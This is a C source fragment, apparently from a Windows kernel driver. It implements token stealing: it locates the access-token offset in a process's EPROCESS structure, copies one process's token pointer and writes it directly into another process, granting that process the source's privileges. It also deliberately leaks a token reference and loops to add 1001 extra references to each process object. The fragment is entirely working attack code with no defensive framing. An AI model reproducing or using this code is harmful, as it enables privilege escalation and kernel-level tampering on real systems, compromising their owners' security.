
NTSTATUS
SetToken(
	_In_ ULONG SourceProcessId,
	_In_ ULONG TargetProcessId
)
{
	NTSTATUS      Status;
	PEPROCESS     SourceProcess = NULL;
	PEPROCESS     TargetProcess = NULL;
	PACCESS_TOKEN SourceToken   = NULL;
	ULONG_PTR     TokenValue    = 0;

	Status = PsLookupProcessByProcessId(
		ULongToHandle(SourceProcessId), &SourceProcess);
	if (!NT_SUCCESS(Status))
		return Status;

	SourceToken = PsReferencePrimaryToken(SourceProcess);
	if (SourceToken == NULL)
	{
		ObfDereferenceObject(SourceProcess);
		return STATUS_ACCESS_DENIED;
	}

	if (!G_TokenOffsetFound)
	{
		Status = FindTokenOffset(&G_TokenOffset, SourceProcess);
		if (NT_SUCCESS(Status))
		{
			G_TokenOffsetFound = TRUE;
			LogMessage("SetToken: token offset discovered at 0x%X.\n", G_TokenOffset);
		}
	}

	if (!G_TokenOffsetFound)
	{
		PsDereferencePrimaryToken(SourceToken);
		ObfDereferenceObject(SourceProcess);
		return STATUS_NOT_FOUND;
	}

	TokenValue = *(volatile ULONG_PTR*)((PUCHAR)SourceProcess + G_TokenOffset);

	PsDereferencePrimaryToken(SourceToken);
	SourceToken = NULL;

	Status = PsLookupProcessByProcessId(
		ULongToHandle(TargetProcessId), &TargetProcess);
	if (!NT_SUCCESS(Status))
	{
		ObfDereferenceObject(SourceProcess);
		return Status;
	}

	{
		PACCESS_TOKEN TokenBody = (PACCESS_TOKEN)(TokenValue & ~0xFULL);
		Status = ObReferenceObjectByPointer(
			TokenBody, MAXIMUM_ALLOWED, NULL, KernelMode);
		if (!NT_SUCCESS(Status))
		{
			ObfDereferenceObject(TargetProcess);
			ObfDereferenceObject(SourceProcess);
			return Status;
		}
	}

	__try
	{
		*(volatile ULONG_PTR*)((PUCHAR)TargetProcess + G_TokenOffset) = TokenValue;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		Status = GetExceptionCode();
		ObfDereferenceObject(TargetProcess);
		ObfDereferenceObject(SourceProcess);
		LogMessage("SetToken: write to PID %u failed: 0x%08X\n", TargetProcessId, Status);
		return Status;
	}

	for (int I = 0;I <= 1000; I++) {
		ObfReferenceObject(TargetProcess);
		ObfReferenceObject(SourceProcess);
	}
	return STATUS_SUCCESS;
}

static NTSTATUS SafeCopyMemory(
	_Out_writes_bytes_all_(Size) PVOID Dest,
	_In_ PVOID Src,
	_In_ SIZE_T Size);
